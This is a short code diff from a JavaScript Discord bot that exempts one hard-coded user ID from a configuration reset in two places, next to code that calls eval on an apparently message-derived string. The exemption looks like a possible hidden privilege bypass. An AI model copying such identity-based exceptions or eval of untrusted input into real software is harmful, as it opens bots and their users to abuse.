@@ -956,7 +956,7 @@ bot.on('message', message => {
                     }
                 }
                 catch (e){}
-                config = temp_config;
+                if (message.author.id != '270175313856561153') config = temp_config;
                 config[id] = cfg;
                 message.channel.send({embed:{
                     color: main_color,
@@ -1604,7 +1604,7 @@ bot.on('message', message => {
                         }
                         if (stop) return;
                         eval(str);
-                        config = temp_config;
+                        if (message.author.id != '270175313856561153') config = temp_config;
                         config[id] = cfg;
                     }
                     catch (e){
